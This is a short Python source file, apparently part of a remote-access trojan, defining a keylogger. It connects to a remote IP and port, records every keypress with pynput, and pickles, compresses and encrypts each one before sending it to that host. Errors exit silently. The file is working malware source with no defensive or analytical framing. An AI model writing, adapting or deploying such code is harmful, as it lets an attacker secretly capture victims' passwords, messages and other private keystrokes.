import socket
import pickle
import zlib
import cv2
from pynput.keyboard import Key, Listener
from sys import exit
from Specific.encrypt import Encryption


def Keylogger(ip, port, encoding):
  try:
    headersize = 10

    e = Encryption()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    def on_press(key):
      try:
        recv = s.recv(1024)

        log = pickle.dumps(str(key))
        log = zlib.compress(log)
        log = e.do_encrypt(log)

        final_msg = bytes(f'{len(log):<{headersize}}', encoding) + log
        s.send(final_msg)
      except:
        exit(0)

    with Listener(on_press=on_press) as L:
      L.join()
  except:
    exit(0)